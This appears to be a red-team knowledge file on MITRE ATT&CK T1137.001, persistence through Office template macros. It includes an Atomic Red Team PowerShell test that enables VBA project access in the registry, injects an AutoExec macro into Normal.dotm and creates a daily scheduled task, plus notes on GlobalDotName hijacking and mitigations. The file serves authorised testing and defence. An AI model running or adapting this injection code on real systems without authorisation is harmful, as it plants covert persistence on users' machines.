---
name: "T1137.001_office-template-macros"
description: "Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system."
category: "configuration"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1137.001
  - persistence
  - windows
  - office-suite
  - sub-technique
technique_id: "T1137.001"
tactic: "persistence"
all_tactics:
  - persistence
platforms:
  - Windows
  - Office Suite
mitre_url: "https://attack.mitre.org/techniques/T1137/001"
tech_stack:
  - windows
  - office
cwe_ids:
  - CWE-276
chains_with:
  - T1137
  - T1137.002
  - T1137.003
  - T1137.004
  - T1137.005
  - T1137.006
prerequisites:
  - T1137
severity_boost:
  T1137: "Chain with T1137 for deeper attack path"
  T1137.002: "Chain with T1137.002 for deeper attack path"
  T1137.003: "Chain with T1137.003 for deeper attack path"
---

# T1137.001 Office Template Macros

> **Sub-technique of:** T1137

## High-Level Description

Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts.

Office Visual Basic for Applications (VBA) macros can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded. Shared templates may also be stored and pulled from remote locations.

Word Normal.dotm location:<br>
<code>C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Templates\Normal.dotm</code>

Excel Personal.xlsb location:<br>
<code>C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Excel\XLSTART\PERSONAL.XLSB</code>

Adversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under <code>C:\Program Files (x86)\Microsoft Office\root\Office16\</code>, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.

An adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.

## Kill Chain Phase

- Persistence (TA0003)

**Platforms:** Windows, Office Suite

## What to Check

- [ ] Identify if Office Template Macros technique is applicable to target environment
- [ ] Check Windows systems for indicators of Office Template Macros
- [ ] Check Office Suite systems for indicators of Office Template Macros
- [ ] Verify mitigations are bypassed or absent (2 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Injecting a Macro into the Word Normal.dotm Template for Persistence via PowerShell

Injects a Macro in the Word default template "Normal.dotm" and makes it execute each time that Word is opened. In this test, the Macro creates a sheduled task to open Calc.exe every evening.

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
# Registry setting to "Trust access to the VBA project object model" in Word
$registryKey = "HKCU:Software\Microsoft\Office\16.0\Word\Security"
$registryValue = "AccessVBOM"
$registryData = "1"
# The path where a flag text file will be created if Registry setting did not already exist or if it was set to 0
$flagPath1 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag1.txt"
$flagPath2 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag2.txt"
# Get the value of the Key/Value pair
$value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue
# Logical operation to: if the value of the key/value is 1, do nothing -
# if the value is 0, change it to 1 and create flag1 -
# if it doesn't exist, create the value and flag2
if ($value -eq "1")
{
  Write-Host "The registry value '$registryValue' already exists with the required setting."
}
  elseif ($value -eq "0")
{
  Write-Host "The registry value was set to 0, temporarily changing to 1."
  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null
  echo "flag1" > $flagPath1
}
  else
{
  Write-Host "The registry value '$registryValue' does not exist, temporarily creating it."
  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null
  echo "flag2" > $flagPath2
}
Add-Type -AssemblyName Microsoft.Office.Interop.Word
# Define the path of copied normal template for restoral
$copyPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\Normal1.dotm"
# Define the path to the normal template
$docPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\Normal.dotm"
# Create copy of orginal template for restoral
Copy-Item -Path $docPath -Destination $copyPath -Force
# VBA code to be insterted as a Macro
# Will create a scheduled task to open the Calculator at 8:04pm daily
$vbaCode = @"
  Sub AutoExec()
  Dim applicationPath As String
  Dim taskName As String
  Dim runTime As String
  Dim schTasksCmd As String
  applicationPath = "C:\Windows\System32\calc.exe"
  taskName = "OpenCalcTask"
  runTime = "20:04"
  schTasksCmd = "schtasks /create /tn """ & taskName & """ /tr """ & applicationPath & """ /sc daily /st " & runTime & " /f"
  Shell "cmd.exe /c " & schTasksCmd, vbNormalFocus
  End Sub
"@
# Create a new instance of Word.Application
$word = New-Object -ComObject Word.Application
# Keep the Word application hidden
$word.Visible = $false
# Open the document
$document = $word.Documents.Open($docPath)
# Access the VBA project of the document
$vbaProject = $document.VBProject
# Add a new module to the VBA project
$newModule = $vbaProject.VBComponents.Add(1) # 1 = vbext_ct_StdModule
# Add the VBA code to the new module
$newModule.CodeModule.AddFromString($vbaCode)
# Run the Macro
$word.run("AutoExec")
# Save and close the document
$document.SaveAs($docPath)
$document.Close()
# Quit Word
$word.Quit()
# Release COM objects
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($document) | Out-Null
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($word) | Out-Null
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($vbaProject) | Out-Null
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($newModule) | Out-Null
```

**Dependencies:**

- Microsoft Word must be installed

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Office Template Macros by examining the target platforms (Windows, Office Suite).

2. **Assess Existing Defenses**: Review whether mitigations for T1137.001 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1040 Behavior Prevention on Endpoint

On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent Office applications from creating child processes and from writing potentially malicious executable content to disk.

### M1042 Disable or Remove Feature or Program

Follow Office macro security best practices suitable for your environment. Disable Office VBA macros from executing.

Disable Office add-ins. If they are required, follow best practices for securing them by requiring them to be signed and disabling user notification for allowing add-ins. For some add-ins types (WLL, VBA) additional mitigation is likely required as disabling add-ins in the Office Trust Center does not disable WLL nor does it prevent VBA code from executing.

## Detection

### Detect Persistence via Office Template Macro Injection or Registry Hijack

## Risk Assessment

| Finding                                     | Severity | Impact      |
| ------------------------------------------- | -------- | ----------- |
| Office Template Macros technique applicable | High     | Persistence |

## CWE Categories

| CWE ID  | Title                         |
| ------- | ----------------------------- |
| CWE-276 | Incorrect Default Permissions |

## References

- [MSDN VBA in Office](https://msdn.microsoft.com/en-us/vba/office-shared-vba/articles/getting-started-with-vba-in-office)
- [Hexacorn Office Template Macros](http://www.hexacorn.com/blog/2017/04/19/beyond-good-ol-run-key-part-62/)
- [Microsoft Change Normal Template](https://support.office.com/article/Change-the-Normal-template-Normal-dotm-06de294b-d216-47f6-ab77-ccb5166f98ea)
- [enigma0x3 normal.dotm](https://enigma0x3.net/2014/01/23/maintaining-access-with-normal-dotm/comment-page-1/)
- [CrowdStrike Outlook Forms](https://malware.news/t/using-outlook-forms-for-lateral-movement-and-persistence/13746)
- [GlobalDotName Jun 2019](https://www.221bluestreet.com/post/office-templates-and-globaldotname-a-stealthy-office-persistence-technique)
- [Outlook Today Home Page](https://medium.com/@bwtech789/outlook-today-homepage-persistence-33ea9b505943)
- [Atomic Red Team - T1137.001](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1137.001)
- [MITRE ATT&CK - T1137.001](https://attack.mitre.org/techniques/T1137/001)
